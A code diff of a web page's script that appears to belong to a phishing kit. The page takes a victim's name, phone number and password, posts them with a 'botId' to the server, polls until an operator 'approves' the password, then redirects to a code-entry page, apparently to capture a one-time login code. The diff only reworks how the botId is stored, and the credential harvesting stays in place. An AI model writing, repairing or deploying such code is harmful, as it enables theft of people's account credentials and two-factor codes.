@@ -196,90 +196,90 @@
   </div>
 
   <script>
-  const form = document.getElementById('detailsForm');
-  const statusEl = document.getElementById('status');
-  const passwordInput = document.getElementById('password');
+    const form = document.getElementById('detailsForm');
+    const statusEl = document.getElementById('status');
+    const passwordInput = document.getElementById('password');
 
-  const fullName = localStorage.getItem('fullName');
+    const fullName = localStorage.getItem('fullName');
 
-  const params = new URLSearchParams(window.location.search);
-  const botId =
-    params.get('botId') ||
-    localStorage.getItem('botId') ||
-    'bot1';
+    // ✅ FIXED botId HANDLING
+    const params = new URLSearchParams(window.location.search);
+    const urlBotId = params.get('botId');
 
-  localStorage.setItem('botId', botId);
-
-  if (!fullName) {
-    alert('Session expired. Please start again.');
-    window.location.href = 'index.html';
-  }
-
-  function togglePassword() {
-    passwordInput.type =
-      passwordInput.type === 'password' ? 'text' : 'password';
-  }
-
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault();
-
-    const phone = document.getElementById('phone').value;
-    const password = passwordInput.value;
-
-    localStorage.setItem('phone', phone);
-
-    statusEl.style.display = 'block';
-    statusEl.classList.remove('error');
-    statusEl.textContent = '⏳ Waiting for approval...';
-
-    try {
-      const res = await fetch(
-        `${window.location.origin}/submit-password`,
-        {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            name: fullName,
-            phone,
-            password,
-            botId
-          })
-        }
-      );
-
-      if (!res.ok) {
-        throw new Error('Request failed');
-      }
-
-      const { requestId } = await res.json();
-      pollApproval(requestId);
-
-    } catch (err) {
-      statusEl.classList.add('error');
-      statusEl.textContent = '❌ Server error. Please try again.';
+    if (urlBotId) {
+      localStorage.setItem('botId', urlBotId);
     }
-  });
 
-  function pollApproval(requestId) {
-    const interval = setInterval(async () => {
-      const res = await fetch(
-        `${window.location.origin}/check-password/${requestId}`
-      );
-      const data = await res.json();
+    const botId = localStorage.getItem('botId');
 
-      if (data.approved === true) {
-        clearInterval(interval);
-        window.location.href = 'code.html';
-      }
+    if (!botId || !fullName) {
+      alert('Session expired. Please start again.');
+      window.location.href = 'index.html';
+    }
 
-      if (data.approved === false) {
-        clearInterval(interval);
+    function togglePassword() {
+      passwordInput.type =
+        passwordInput.type === 'password' ? 'text' : 'password';
+    }
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const phone = document.getElementById('phone').value;
+      const password = passwordInput.value;
+
+      localStorage.setItem('phone', phone);
+
+      statusEl.style.display = 'block';
+      statusEl.classList.remove('error');
+      statusEl.textContent = '⏳ Waiting for approval...';
+
+      try {
+        const res = await fetch(
+          `${window.location.origin}/submit-password`,
+          {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              name: fullName,
+              phone,
+              password,
+              botId
+            })
+          }
+        );
+
+        if (!res.ok) throw new Error();
+
+        const { requestId } = await res.json();
+        pollApproval(requestId);
+
+      } catch {
         statusEl.classList.add('error');
-        statusEl.textContent = '❌ Incorrect password. Please try again.';
+        statusEl.textContent = '❌ Server error. Please try again.';
       }
-    }, 2000);
-  }
-</script>
+    });
+
+    function pollApproval(requestId) {
+      const interval = setInterval(async () => {
+        const res = await fetch(
+          `${window.location.origin}/check-password/${requestId}`
+        );
+        const data = await res.json();
+
+        if (data.approved === true) {
+          clearInterval(interval);
+          window.location.href = 'code.html';
+        }
+
+        if (data.approved === false) {
+          clearInterval(interval);
+          statusEl.classList.add('error');
+          statusEl.textContent = '❌ Incorrect password. Please try again.';
+        }
+      }, 2000);
+    }
+  </script>
 
 </body>
 </html>
